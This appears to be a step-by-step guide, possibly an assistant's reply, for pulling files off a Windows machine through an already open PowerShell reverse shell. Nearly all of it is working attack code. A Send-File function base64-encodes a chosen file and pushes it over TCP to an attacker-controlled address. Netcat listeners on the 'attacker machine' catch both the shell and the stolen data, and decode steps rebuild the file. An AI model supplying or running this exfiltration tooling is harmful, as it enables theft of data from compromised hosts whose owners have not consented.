## Create the Function Correctly

### Method 1: One-Liner Function (Easiest)
Copy and paste this entire line into your PowerShell reverse shell:

```powershell
function Send-File { param($path) $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path)); $c = New-Object Net.Sockets.TCPClient('192.168.150.4', 4445); $c.GetStream().Write([Text.Encoding]::UTF8.GetBytes($b64), 0, $b64.Length); $c.Close(); Write-Host "Sent!" }
```

### Method 2: Multi-Line Function (Proper Format)
If you prefer multi-line, type it one line at a time. **Important:** Press **Enter** after each line. PowerShell will show `>>` for continuation lines.

```powershell
function Send-File {
    param($path)
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
    $c = New-Object Net.Sockets.TCPClient('192.168.150.4', 4445)
    $c.GetStream().Write([Text.Encoding]::UTF8.GetBytes($b64), 0, $b64.Length)
    $c.Close()
    Write-Host "Sent!"
}
```

---

## Verify the Function Created
After pasting, test to see if the function exists:

```powershell
# Check if function exists
Get-Command Send-File
```

**Expected Output:**
| CommandType | Name | Version | Source |
| :--- | :--- | :--- | :--- |
| Function | Send-File | | |

---

## Use the Function
Run the command followed by the file path:

```powershell
Send-File 'C:\Users\sesan\Downloads\22059d24-f1a3-4e7b-a527-fc4f04e7afff.png'
```

---

## On Attacker Machine - Before Running Send-File
In a new Mac terminal (**Terminal 2**), start the receiver:

```bash
nc -lnvp 4445 > received_base64.b64
```

---

## Complete Working Example

### 1. Mac - Terminal 1 (Command Listener - existing)
```bash
nc -lnvp 4444
```

### 2. Mac - Terminal 2 (File Receiver - new)
```bash
nc -lnvp 4445 > received_base64.b64
```

### 3. Windows - Reverse Shell (in your existing PowerShell)
```powershell
# Paste this ONE-LINER
function Send-File { param($path) $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path)); $c = New-Object Net.Sockets.TCPClient('192.168.150.4', 4445); $c.GetStream().Write([Text.Encoding]::UTF8.GetBytes($b64), 0, $b64.Length); $c.Close(); Write-Host "Sent!" }

# Then send the file
Send-File 'C:\Users\sesan\Downloads\22059d24-f1a3-4e7b-a527-fc4f04e7afff.png'
```

### 4. Mac - Terminal 2 (after transfer completes)
```bash
# Press Ctrl+C to stop netcat

# Then decode the Base64
base64 -D < received_base64.b64 > downloaded.png

# Verify
file downloaded.png
open downloaded.png
```